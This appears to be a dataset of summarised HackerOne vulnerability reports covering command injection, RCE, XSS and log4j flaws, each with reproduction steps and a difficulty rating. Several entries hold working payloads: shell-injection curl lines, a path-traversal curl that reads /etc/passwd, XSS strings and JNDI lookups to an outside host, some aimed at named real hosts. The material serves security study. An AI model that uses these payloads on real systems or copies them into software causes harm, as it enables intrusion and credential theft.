Report https://hackerone.com/reports/1574078: DNS rebinding in --inspect (again) via invalid IP addresses 
================================================================================
Vulnerability Description:
The vulnerability is a DNS rebinding attack in Node.js's --inspect feature, where an invalid IP address (like 10.0.2.555) is used to bypass the IsAllowedHost check. This allows an attacker to trick the browser into making DNS requests to a malicious DNS server, which can then rebind to localhost (127.0.0.1) and access the Node.js debugger's JSON file, leading to potential remote code execution.

Steps to Reproduce:
1. Victim runs node with --inspect option
2. Victim visits attacker's webpage
3. The attacker's webpage redirects to http://10.0.2.555:9229
4. 10.0.2.555 is not a valid IP address so the browser asks the malicious DNS server and gets <attacker's-IP> with a short TTL.
5. Victim loads webpage http://10.0.2.555:9229 from <attacker's-IP>.
6. The webpage http://10.0.2.555:9229 tries to load http://10.0.2.555:9229/json from attacker's server.
7. Due to a short TTL, the DNS server will be soon asked again about an entry for “10.0.2.555”. This time, the DNS server responds “127.0.0.1”.
8. The http://10.0.2.555:9229 website (i.e., the one hosted on <attacker's IP>) will retrieve http://10.0.2.555:9229/json from 127.0.0.1, including webSocketDebuggerUrl.
9. Now, the attacker knows the webSocketDebuggerUrl and can connect to is using WebSocket. Note that WebSocket is not restricted by same-origin-policy. By doing so, they can gain the privileges of the Node.js instance.
Exploitation Difficulty:
The attack involves multiple components (Node.js debugger, DNS server, browser behavior) and requires understanding of DNS rebinding, but the core vulnerability stems from a straightforward validation flaw in the IsIPAddress check. The interaction between these components is somewhat subtle but not overly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1672388: RCE via github import
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution (RCE) through a GitHub import feature in GitLab. By crafting a malicious response from a GitHub API simulation, an attacker can manipulate Redis commands via a Sawyer object, leading to arbitrary command execution on the GitLab server.

Steps to Reproduce:
1. Run a dummy server with node.js to simulate a GitHub API response that includes a specially crafted Sawyer object to manipulate Redis commands.
2. Trigger a GitHub import in GitLab by sending a POST request to the /api/v4/import/github endpoint with the crafted response as the GitHub hostname.
Exploitation Difficulty:
The attack involves multiple complex components including manipulating Redis commands through a Sawyer object, understanding GitLab's import process, and crafting a malicious GitHub API response. The interaction between these components is subtle and requires deep knowledge of both GitLab's internal workings and Redis command injection techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/260005: RCE via ssh:// URIs in multiple VCS 
================================================================================
Vulnerability Description:
The vulnerability involves multiple version control systems (Git, SVN, Mercurial) where a crafted ssh:// URI can lead to remote code execution (RCE). The flaw lies in how these systems handle ssh:// URIs, allowing an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. Identify the vulnerability in Git, SVN, and Mercurial related to ssh:// URIs.
2. Exploit the vulnerability by crafting a malicious ssh:// URI that triggers remote code execution when processed by the VCS.
Exploitation Difficulty:
The vulnerability requires understanding the handling of ssh:// URIs across different VCS systems and crafting a malicious URI that exploits this common flaw. The interaction between the URI parsing and command execution is non-obvious and involves multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2742457: CVE-2020-7961 RCE Liferay Portal Unauthenticated via https://████████/
================================================================================
Vulnerability Description:
This vulnerability is an unauthenticated remote code execution (RCE) in Liferay Portal via a deserialization flaw. The attacker can send a specially crafted request to the JSONWS API endpoint, which allows them to execute arbitrary commands on the server. The exploit leverages the C3P0 library's deserialization feature to achieve RCE.

Steps to Reproduce:
1. Send a POST request to /api/jsonws/invoke with a crafted payload that includes a command to execute (e.g., systeminfo).
2. The crafted payload exploits a deserialization vulnerability in Liferay Portal to execute arbitrary commands on the server.
Exploitation Difficulty:
The attack involves a single, straightforward HTTP request with a crafted payload. While the payload itself is complex due to the serialized Java objects, the overall attack flow is simple and does not require multiple steps or understanding of complex application states. The vulnerability is well-documented (CVE-2020-7961), making it easier to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/331032: [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
================================================================================
Vulnerability Description:
The vulnerability allows Remote Code Execution (RCE) in the buttle module when run with the --php-bin option. The PHP filename is not sanitized before being passed to the spawn() method, enabling command injection via shell metacharacters (e.g., semicolons) in the URL.

Steps to Reproduce:
1. Install buttle: `npm i buttle`
2. Run buttle with PHP support: `./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php`
3. Execute a curl command with injected shell commands: `curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo "uh oh, RCE :P"`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common command injection pattern (unsanitized input passed to a shell command) and does not require complex interactions or state manipulation. The attack vector is direct and well-documented in security literature.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/341710: [git-dummy-commit] Command injection on the msg parameter
================================================================================
Vulnerability Description:
The git-dummy-commit module is vulnerable to command injection via the 'msg' parameter, which is appended to a command without proper escaping. This allows an attacker to execute arbitrary commands on the victim's machine by controlling the 'msg' parameter.

Steps to Reproduce:
1. Install the module: npm install git-dummy-commit
2. Create an index.js file with the following content:
const gitDummyCommit = require('git-dummy-commit');
gitDummyCommit('"touch a"');
3. Run the script: node index.js
4. Check for the newly created file 'a' in the directory: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a direct command injection through a single parameter without any complex interactions or state manipulations. The attack vector is simple and well-known in security testing.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/506646: Webshell via File Upload on ecjobs.starbucks.com.cn
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to upload malicious ASP files by bypassing file type restrictions through adding a space after the file extension. This leads to arbitrary command execution on the server, potentially exposing sensitive data and internal network access.

Steps to Reproduce:
1. Sign in to https://ecjobs.starbucks.com.cn and navigate to the resume endpoint.
2. Intercept the avatar upload request using Burp Suite, modify the filename by adding a space after the file extension (e.g., '.asp '), and upload a malicious ASP file.
3. Access the uploaded file to execute OS commands on the server, such as listing directories or viewing source code.
Exploitation Difficulty:
The attack involves a simple bypass technique (adding a space) and straightforward file upload manipulation. The interaction between the file upload and command execution is direct and does not require complex application state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/511459: [listening-processes] Command Injection
================================================================================
Vulnerability Description:
The 'listening-processes' module is vulnerable to command injection because it directly incorporates user input into shell commands without proper sanitization. An attacker can escape the intended command context and execute arbitrary commands by injecting shell metacharacters.

Steps to Reproduce:
1. Install the 'listening-processes' module (version 1.2.0) in a Node.js environment
2. Execute the vulnerable code snippet: `const processes = require('listening-processes'); processes("'Python && whoami >> hh;'")`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it follows a common command injection pattern where unsanitized user input is passed directly to shell commands. The attack does not require understanding of complex application states or novel logic, and the interaction between components is obvious (user input directly affects command execution).

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/534630: Remote Code Execution - Unauthenticated Remote Command Injection (via Microsoft SharePoint CVE-2019-0604)
================================================================================
Vulnerability Description:
This vulnerability is an unauthenticated remote code execution flaw in Microsoft SharePoint (CVE-2019-0604), caused by improper deserialization of untrusted data. An attacker can craft a malicious parameter to a SharePoint URL, leading to arbitrary command execution on the server.

Steps to Reproduce:
1. Clone the GitHub repository for the PoC code: https://github.com/l00ph0le/CVE-2019-0604.git
2. Edit the second '<System:String>/c calc</System:String>' in t.xml to the desired command to execute on the server
3. Use 'ConsoleApplication1.exe' to generate an encoded payload from the modified t.xml file
4. Set up an interception proxy (e.g., BurpSuite) and browse to the vulnerable SharePoint URL
5. Intercept the request to 'Picker.aspx' and modify the 'hiddenSpanData' parameter with the encoded payload
6. Allow the request to proceed and observe the command execution on the server
Exploitation Difficulty:
The attack involves multiple components (PoC code, payload generation, request interception, and parameter manipulation) and requires understanding of SharePoint's internal deserialization process. However, the steps are well-documented and the exploit follows a predictable pattern once the vulnerability is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/546753: Remote Code Execution via Extract App Plugin
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in the Nextcloud Extract plugin due to improper sanitization of user input in the 'unrar' command execution. An attacker can inject arbitrary commands via the 'nameOfFile' parameter, leading to full system compromise.

Steps to Reproduce:
1. Install the Extract plugin from the Nextcloud Apps menu.
2. Upload a RAR file and use the 'Extract Here' functionality while intercepting the request with a tool like BurpSuite.
3. Modify the 'nameOfFile' parameter in the intercepted request to include a command injection payload.
4. Execute the payload to download and run a reverse shell script on the server.
Exploitation Difficulty:
The attack involves multiple steps including intercepting and modifying HTTP requests, crafting command injection payloads, and setting up a reverse shell. However, the vulnerability itself is straightforward once the command injection vector is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/591295: Potential pre-auth RCE on Twitter VPN
================================================================================
Vulnerability Description:
This vulnerability involves a chain of exploits in Pulse Secure SSL VPN, starting with a pre-auth arbitrary file read (CVE-2019-11510) to extract sensitive data, bypassing 2FA, and culminating in a post-auth command injection (CVE-2019-11542) to achieve remote code execution. The attack leverages multiple CVEs and requires intricate steps to manipulate the VPN's state and data.

Steps to Reproduce:
1. Exploit CVE-2019-11510 to download critical files including /etc/passwd, /etc/hosts, and database files from the Pulse Secure VPN server.
2. Extract plain-text passwords from the cached data in dataa/data.mdb to gain VPN access.
3. Bypass Two-Factor Authentication by reusing session data from randomVal/data.mdb or manipulating the secret-key.
4. Access the admin interface via the web proxy function at https://0/admin/ to exploit post-auth vulnerabilities.
5. Chain CVE-2019-11542 (command injection) with other vulnerabilities to achieve pre-auth RCE.
Exploitation Difficulty:
The attack involves multiple complex components including file reading, session hijacking, 2FA bypass, and command injection. It requires deep understanding of the VPN's architecture, subtle interactions between vulnerabilities, and manipulation of complex application states to chain exploits effectively.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/634630: Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ [CVE-2017-10352]
================================================================================
Vulnerability Description:
The vulnerability is a Remote OS Command Execution (RCE) in outdated Oracle WebLogic instances due to improper handling of XML data in SOAP requests. Attackers can exploit this by sending crafted SOAP requests that trigger command execution on the server.

Steps to Reproduce:
1. Send a POST request to the vulnerable WebLogic endpoint '/wls-wsat/CoordinatorPortType' with a crafted SOAP envelope containing a sleep command in the WorkContext header.
2. Send another POST request to the same endpoint with a different crafted SOAP envelope containing an OS command (e.g., nslookup to a Burp Collaborator domain) in the WorkContext header to demonstrate command execution.
Exploitation Difficulty:
The attack involves crafting specific SOAP requests to exploit a known vulnerability (CVE-2017-10352) in WebLogic. The steps are straightforward and do not require complex interactions or state manipulation. The vulnerability is well-documented and the exploit pattern is common for this type of issue.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/654888: OS Command Injection in Nexus Repository Manager 2.x
================================================================================
Vulnerability Description:
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution via OS Command Injection. An authenticated user with sufficient privileges can exploit this by manipulating the path of 'createrepo' or 'mergerepo' in the Yum Configuration Capability to execute arbitrary commands on the underlying operating system.

Steps to Reproduce:
1. Navigate to 'Capabilities' in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., C:\Windows\System32\calc.exe).
3. The OS command will execute as the SYSTEM user, as Nexus appends --version to the OS command.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a configuration parameter to inject OS commands. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/671749: Pulse Secure File disclosure, clear text and potential RCE
================================================================================
Vulnerability Description:
The vulnerability involves a file disclosure issue in Pulse Secure due to path normalization problems, allowing an attacker to access sensitive files like /etc/passwd and /data/runtime/mtmp/lmdb/dataa/data.mdb, which contains clear text credentials. This can lead to further exploitation such as post-authentication RCE.

Steps to Reproduce:
1. Use curl with the --path-as-is flag to bypass path normalization and access sensitive files on the Pulse Secure server.
2. Retrieve the file /data/runtime/mtmp/lmdb/dataa/data.mdb which contains clear text passwords and usernames.
Exploitation Difficulty:
The attack requires knowledge of specific file paths and the use of curl with specific flags to bypass path normalization. However, once the initial file disclosure is understood, accessing the sensitive files is straightforward.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/678496: Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███
================================================================================
Vulnerability Description:
The vulnerability involves a chain of exploits starting with an arbitrary file read (CVE-2019-11510) to retrieve plaintext credentials stored in the VPN system, followed by authentication and exploitation of a post-auth command injection (CVE-2019-11539) to achieve remote code execution as root.

Steps to Reproduce:
1. curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
2. Read credentials from /data/runtime/mtmp/lmdb/dataa/data.mdb and authenticate to the VPN
3. Exploit CVE-2019-11539 to achieve RCE as root
Exploitation Difficulty:
The attack involves multiple components: exploiting a pre-auth arbitrary file read to obtain credentials, authenticating to the VPN, and then exploiting a post-auth command injection. While the individual steps are documented in public vulnerabilities, chaining them together requires understanding the interaction between these components and the system's state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/685447: gitlabhook OS Command Injection
================================================================================
Vulnerability Description:
The gitlabhook module is vulnerable to OS Command Injection via the 'ExecFile' function at line 146, which executes commands without proper sanitization. User input is directly passed to this function, allowing an attacker to execute arbitrary commands on the server.

Steps to Reproduce:
1. Install the gitlabhook module: npm install gitlabhook
2. Run the server: node gitlabhook-server.js
3. Execute the Python exploit script targeting the server with a command to create a file
4. Verify the file was created on the server: ls /tmp/poc.txt
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of unsanitized user input in a command execution function. The attack does not require complex interactions or state manipulations, and the exploit is simple to construct and execute.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/810755: Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]
================================================================================
Vulnerability Description:
This vulnerability is a Remote OS Command Execution (RCE) in an outdated Oracle WebLogic server due to CVE-2017-10271. It allows an unauthenticated attacker to execute arbitrary commands by sending a crafted SOAP request to the vulnerable endpoint.

Steps to Reproduce:
1. Send a POST request to https://raebilling.mtn.co.za/wls-wsat/RegistrationPortTypeRPC with the specified XML payload that includes a sleep command.
2. Observe the delayed response (15, 20, or 40 seconds) indicating successful execution of the sleep command, confirming the RCE vulnerability.
Exploitation Difficulty:
The attack involves a single, well-documented exploit (CVE-2017-10271) with a straightforward payload. The steps are simple and do not require complex interactions or state manipulation. The vulnerability is publicly known and the exploit is widely available.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/810778: Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]
================================================================================
Vulnerability Description:
This vulnerability allows remote OS command execution on an outdated Oracle WebLogic server via CVE-2017-3506. An attacker can execute arbitrary commands by sending a specially crafted SOAP request to the WebLogic server's RegistrationRequesterPortType endpoint.

Steps to Reproduce:
1. Send a POST request to https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType with a crafted SOAP envelope containing a ProcessBuilder object.
2. The crafted SOAP envelope includes a command to execute a ping or nslookup with a subdomain containing the output of the 'whoami' command, sent to a Burp Collaborator instance or private VPS.
Exploitation Difficulty:
The attack involves a single, well-documented exploit (CVE-2017-3506) with a straightforward payload. The steps are simple and do not require complex interactions or state manipulation. The exploit is well-known and publicly documented, making it easy to reproduce.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/955016: GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
================================================================================
Vulnerability Description:
GitLab-Runner on Windows is vulnerable to Command Injection via the DOCKER_AUTH_CONFIG build variable. This allows an attacker to execute arbitrary commands on the container host by exploiting path traversal in the Credential Helper values, which are processed unsanitized.

Steps to Reproduce:
1. Register and run a GitLab Runner on a Windows system with a docker executor and a specific tag (e.g., windows-docker-runner).
2. Create a Build with a .gitlab-ci.yml file containing a malicious DOCKER_AUTH_CONFIG variable that specifies a path traversal to an executable (e.g., calc.exe).
Exploitation Difficulty:
The vulnerability involves understanding the interaction between GitLab-Runner's handling of the DOCKER_AUTH_CONFIG variable and Windows' path normalization behavior. The attack requires knowledge of how Credential Helpers are executed and how path traversal can bypass intended security checks on Windows systems.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Generic Vulnerabilities (14 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1404804: Email templates XSS by filterXSS bypass
================================================================================
Vulnerability Description:
The vulnerability involves bypassing XSS filters in email templates using a custom `onIgnoreTag` function, leading to a Self-XSS that can be escalated to account takeover via HMAC authentication and CSP bypass. The attack allows reading HTML content from victim's pages and potentially stealing API tokens through clickjacking.

Steps to Reproduce:
1. Identify the XSS bypass in the custom `onIgnoreTag` function of js-xss used in email templates preview.
2. Craft a malicious HTML email template using the bypass: `<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">`
3. Use HMAC authentication to force another user to log into your account and preview the malicious email.
4. Load an iframe with the victim's page (authenticated as victim) and another iframe with the XSS (authenticated as you).
5. Use the XSS to read `parent.frames[0]` HTML content, bypassing CSP by triggering the XSS on `www.judge.me` subdomain.
6. Perform clickjacking on `https://judge.me/settings` to retrieve the victim's API private token if user interaction is needed.
Exploitation Difficulty:
This vulnerability requires understanding multiple components: XSS filter bypass, HMAC authentication, CSP bypass, and clickjacking. The interactions between these components are subtle and non-obvious, especially the manipulation of application states across different authentication contexts and subdomains.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1436142: New XSS vector in ReaderMode with %READER-TITLE-NONCE%
================================================================================
Vulnerability Description:
The vulnerability allows for XSS attacks in Brave's ReaderMode due to a relaxed CSP rule that permits script execution with a specific nonce. An attacker can inject malicious scripts via the <meta name="author"> tag, which is not properly escaped, leading to script execution in the ReaderMode context. This can be exploited to steal cross-origin pages converted to ReaderMode and gain access to Brave's privileged pages.

Steps to Reproduce:
1. Show https://csrf.jp/2021/brave/author_xss.php
2. Push reader mode button on the address bar
3. An alert dialog is shown
Exploitation Difficulty:
The attack requires understanding of the CSP relaxation, the nonce usage in ReaderMode, and the unescaped meta tag content. However, once these components are known, the exploitation is straightforward.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1542510: XSS in ZenTao integration affecting self hosted instances without strict CSP
================================================================================
Vulnerability Description:
The ZenTao integration in GitLab is vulnerable to XSS attacks due to unsanitized URLs in API responses, allowing attackers to inject JavaScript via crafted issue details.

Steps to Reproduce:
1. Log in to a self-hosted GitLab instance with premium subscription and create a new project.
2. Configure ZenTao integration with a malicious server URL and visit the issue details page to trigger XSS.
Exploitation Difficulty:
The vulnerability involves understanding the ZenTao integration flow, API response handling, and HTML injection techniques, but the steps to exploit are straightforward once these components are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1588732: CSP-bypass XSS in project settings page
================================================================================
Vulnerability Description:
The vulnerability is a CSP-bypass XSS in the project settings page where user-controlled input (deployment key title) is rendered without proper sanitization, allowing execution of arbitrary JavaScript despite Content Security Policy restrictions.

Steps to Reproduce:
1. Navigate to project settings and add a deploy key with a malicious script in the title field
2. Access the protected branches section to trigger execution of the injected script
Exploitation Difficulty:
While the vulnerability involves understanding how user input flows through the system and bypasses CSP, the attack vector is relatively straightforward once the unsanitized input field is identified. The main complexity comes from recognizing the jQuery rendering behavior that bypasses CSP's 'strict-dynamic' restriction.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/176065: [Android] HTML Injection in BatterySaveArticleRenderer WebView
================================================================================
Vulnerability Description:
The vulnerability is an HTML injection in the BatterySaveArticleRenderer WebView of the Android Brave Browser. By injecting a script into the title or author name fields, an attacker can manipulate the WebView to redirect to a malicious URL or alter the page content. The injected script executes when the Article Mode is activated, demonstrating a lack of proper input sanitization in the WebView rendering process.

Steps to Reproduce:
1. Open https://blackfan.ru/brave or a custom HTML file containing the provided script
2. Wait for the page to fully load, then click on the ArticleModeButton
Exploitation Difficulty:
The vulnerability involves a straightforward HTML injection that does not require complex interactions between components or manipulation of application states. The attack vector is direct and leverages common web vulnerabilities (HTML/JS injection) in a WebView context, which is a well-known security issue pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/192223: XSS vulnerability on Audio and Video parsers
================================================================================
Vulnerability Description:
The vulnerability is an XSS (Cross-Site Scripting) issue in the audio and video parsers of the application. By injecting a maliciously crafted URL containing a single quote and JavaScript code, an attacker can execute arbitrary JavaScript in the context of the user's browser session.

Steps to Reproduce:
1. Identify an audio or video parser in the application that processes user-provided URLs.
2. Craft a malicious URL with an XSS payload, such as: http://host/path'onerror=alert(1);//k.mp3 for audio or http://host/path'onerror=alert(1);//k.mp4 for video.
Exploitation Difficulty:
The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability is a classic XSS flaw that requires only the injection of a simple payload into a URL, which is a well-known and common attack vector.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/192786: Reflected XSS in U2F plugin by shipping the example endpoints
================================================================================
Vulnerability Description:
The vulnerability is a reflected XSS in the U2F plugin due to the inclusion of example endpoints in the release package. The file /apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php echoes user input without proper sanitization, allowing for XSS attacks when specially crafted input is submitted.

Steps to Reproduce:
1. Run a RIPS scan against the source code to identify the vulnerable file: /apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php
2. Craft a CSRF PoC that sends malicious input to the vulnerable endpoint, triggering a reflected XSS popup
Exploitation Difficulty:
While the vulnerability involves understanding the interaction between the example endpoint and user input, the discovery process was straightforward with the use of automated scanning tools (RIPS). The attack requires crafting a CSRF payload but doesn't involve complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/197902: Stored XSS in topics because of whitelisted_generic engine vulnerability
================================================================================
Vulnerability Description:
The vulnerability is a Stored XSS in topics due to a flaw in the whitelisted_generic onebox engine. Despite escaping OpenGraph data, the engine decodes variable values and injects them into raw HTML, allowing XSS attacks.

Steps to Reproduce:
1. Paste the payload URL in the topic: http://89.223.28.48/og_image.html?uncache1234
2. View the example post with stored XSS: https://try.discourse.org/t/testing-is-in-progress/620
Exploitation Difficulty:
The attack involves understanding the interaction between OpenGraph data escaping and the whitelisted_generic engine's decoding process. The vulnerability requires knowledge of how the engine processes and injects data, but the steps to exploit it are straightforward once the flaw is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/197914: Stored XSS in posts because of absence of oembed variables values escaping
================================================================================
Vulnerability Description:
The vulnerability is a stored XSS in posts due to the absence of escaping in oembed variable values. When a malicious oembed URL is embedded in a post, it fetches JSON data that contains unescaped JavaScript, which is then executed in the context of the page when the post is viewed.

Steps to Reproduce:
1. Paste the payload URL 'http://89.223.28.48/oembed_video.html?uncache' into a post.
2. Save the post to trigger the XSS payload when the post is viewed.
Exploitation Difficulty:
The attack involves understanding the oembed protocol and crafting a malicious JSON response that includes unescaped JavaScript. While the components are straightforward (oembed URL and JSON response), the interaction between them is non-obvious as it requires knowledge of how the onebox parser processes oembed data and injects it into the page.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/203515: Wordpress 4.7.2 - Two XSS in Media Upload when file too large.
================================================================================
Vulnerability Description:
An attacker can inject a malicious script into the filename of a file that exceeds the maximum upload size limit. When the upload fails due to size, the filename is interpolated into an error message without proper sanitization, leading to XSS in the administrator's control panel.

Steps to Reproduce:
1. Create a large file (e.g., 20MB) with a malicious filename containing an XSS payload, such as 'Dinosaurs secret life<img src=x onerror=alert(1)>.png'.
2. Upload the file to a WordPress site via the media uploader (e.g., http://127.0.0.1/wp-admin/media-new.php) using drag-and-drop, file manager, or the 'Select Files' button.
Exploitation Difficulty:
The vulnerability involves understanding the file upload process and error handling in WordPress, but the XSS payload injection is straightforward once the file size limit is known. The interaction between the filename and the error message is a common XSS vector, making the discovery process less complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/330356: [html-pages] Stored XSS in the filename when directories listing
================================================================================
Vulnerability Description:
The vulnerability is a Stored Cross-Site Scripting (XSS) in the html-pages module, where malicious JavaScript code can be executed in the user's browser by creating a directory with a specially crafted name. The lack of path sanitization allows the script to be injected into the HTML output, specifically in the title and breadcrumb sections of the directory listing page.

Steps to Reproduce:
1. Install the module: $ npm install html-pages
2. Create a directory with a malicious name: '><svg onload=alert(5);>'
3. Start the server: $ ./node_modules/html-pages/bin/index.js -p 6060
4. Access the directory via browser: http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
Exploitation Difficulty:
The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability arises from a basic lack of input sanitization, a common issue in web applications. The steps to reproduce are simple and do not require any advanced knowledge or manipulation of application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/344069: The react-marked-markdown module allows XSS injection in href values.
================================================================================
Vulnerability Description:
The react-marked-markdown module incorrectly sanitizes href values in markdown links, allowing arbitrary JavaScript code execution (XSS) even when the sanitize option is enabled. This occurs because the module overwrites the link rendering method without properly escaping href attributes.

Steps to Reproduce:
1. Install the react-marked-markdown module (version 1.4.6) in a React project.
2. Use the MarkdownPreview component with the markedOptions.sanitize set to true and pass a malicious markdown string containing a JavaScript URI in a link, e.g., '[XSS](javascript: alert1)'.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS pattern (JavaScript URIs in links) and the issue manifests with basic usage of the library. The only non-obvious aspect is that it persists despite the sanitize flag being set, but this is easily verifiable.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/47280: JSON keys are not properly escaped
================================================================================
Vulnerability Description:
Rails does not properly escape HTML special characters in JSON keys when generating JSON output, which can lead to XSS vulnerabilities when the JSON is embedded in a JavaScript context. This allows an attacker to inject malicious scripts that execute in the context of the victim's browser.

Steps to Reproduce:
1. Create a JSON object with a key that contains HTML special characters (e.g., {"</script><script>alert(1)//"=>"xss"})
2. Pass this object to Rails' to_json method and observe the output (e.g., javascript_tag "var json=#{params.to_json}")
Exploitation Difficulty:
The vulnerability involves understanding JSON serialization behavior in Rails and recognizing that keys are not escaped while values are. The attack requires knowledge of how script tags can be broken out of in HTML/JS contexts, but the core issue is relatively straightforward once the JSON serialization behavior is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/906433: Android WebViews in Twitter app are vulnerable to UXSS due to configuration and CVE-2020-6506
================================================================================
Vulnerability Description:
Twitter for Android is affected by a UXSS vulnerability due to its configuration of Android WebView and CVE-2020-6506. An Android WebView instance with WebSettings.setSupportMultipleWindows() kept at default or set to false allows an iframe on a different origin bypass same-origin policies and execute arbitrary JavaScript in the top document.

Steps to Reproduce:
1. Using the PoC 1 Card, navigate to https://alesandroortiz.com/security/chromiumwebview/cve-2020-6506.html
2. Tap/click iframe.
Exploitation Difficulty:
This vulnerability involves understanding the configuration of Android WebView and the specific conditions under which CVE-2020-6506 can be exploited. The attack requires setting up a malicious iframe and understanding how user interactions can trigger the exploit, but the components and interactions are relatively straightforward once the vulnerability is known.

--------------------------------------------------------------------------------



Resource Injection Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1409788: Arbitrary POST request as victim user from HTML injection in Jupyter notebooks
================================================================================
Vulnerability Description:
An attacker can create a Jupyter notebook with HTML that, when viewed by another user (including admins), triggers arbitrary POST requests as the victim user. This can lead to actions like creating new admin accounts or modifying project settings without the victim's consent.

Steps to Reproduce:
1. Create a Jupyter notebook file with malicious HTML content that includes specific data attributes and classes to trigger POST requests when viewed.
2. Upload the notebook to GitLab and have a victim user (potentially an admin) view the notebook, causing arbitrary POST requests to be made on their behalf.
Exploitation Difficulty:
The vulnerability requires understanding of GitLab's JavaScript initialization routines, specific data attributes that trigger POST requests, and how to bypass DOMPurify's sanitization. The attacker must also craft the HTML to include the correct classes and attributes to hook into GitLab's UI JavaScript.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/501585: Zero-amount miner TX + RingCT allows monero wallet to receive arbitrary amount of monero
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to create a specially crafted block with a zero-amount miner transaction that includes RingCT signatures. The wallet incorrectly interprets these signatures as a valid transaction with an arbitrary amount chosen by the attacker. This can be exploited to trick exchanges into crediting the attacker's account with counterfeit XMR.

Steps to Reproduce:
1. Modify the daemon to create block templates with zero amount in the miner transaction and valid-enough RCT signatures.
2. Mine a block directly to an exchange wallet, bypassing payment ID restrictions by modifying the daemon if necessary.
Exploitation Difficulty:
This vulnerability involves deep understanding of both the Monero daemon's block verification rules and the wallet's transaction processing logic. The attacker must manipulate the daemon to produce invalid blocks that still pass verification, and exploit a subtle interaction between zero-amount transactions and RingCT signature handling in the wallet.

--------------------------------------------------------------------------------



Use of Externally-Controlled Format String Vulnerabilities (4 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1423496: ██████████ running a vulnerable log4j
================================================================================
Vulnerability Description:
The vulnerability is a remote code execution (RCE) flaw in the log4j library (CVE-2021-44228), where an attacker can exploit the Java Naming and Directory Interface (JNDI) to execute arbitrary code by injecting a malicious payload into input fields that are logged by the application.

Steps to Reproduce:
1. Browse to the target website and navigate to the login page.
2. Enter the payload `${jndi:ldap://dns-server-yoi-control/a}` into the username field and a random password into the password field.
3. Submit the login form.
4. Observe if a request is made to your DNS server, indicating a vulnerable log4j instance.
Exploitation Difficulty:
The attack is straightforward and involves a single, well-documented payload. The complexity is low because the vulnerability is widely known, and the steps to reproduce it are simple and do not require understanding complex interactions or states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1438393: ███ ████████ running a vulnerable log4j
================================================================================
Vulnerability Description:
The vulnerability involves exploiting a known issue in log4j (CVE-2021-44228) where a malicious JNDI string can trigger arbitrary code execution via LDAP requests. This is a widespread and well-documented vulnerability affecting many systems using log4j for logging.

Steps to Reproduce:
1. Browse to the target URL and enter a malicious JNDI string (e.g., ${jndi:ldap://dns-server-yoi-control/a}) into the username field.
2. Submit the form and observe if a request is made to the specified DNS server, indicating a vulnerable log4j instance.
